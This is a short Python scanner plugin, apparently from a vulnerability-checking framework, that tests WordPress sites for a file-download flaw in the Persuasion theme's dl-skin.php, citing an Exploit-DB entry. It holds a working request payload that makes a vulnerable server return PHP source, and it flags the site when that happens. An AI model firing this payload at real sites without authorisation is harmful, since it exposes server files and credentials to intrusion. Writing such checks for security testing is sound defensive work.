#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '半块西瓜皮'
#http://www.exploit-db.com/exploits/30443/

import  re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'wp-content/themes/persuasion/lib/scripts/dl-skin.php?_mysite_download_skin=dl-skin.php&_mysite_delete_skin_zip='
    verify_url = arg  + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if  code == 200 and '<?' in res and '_mysite_delete_skin_zip' in res:
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])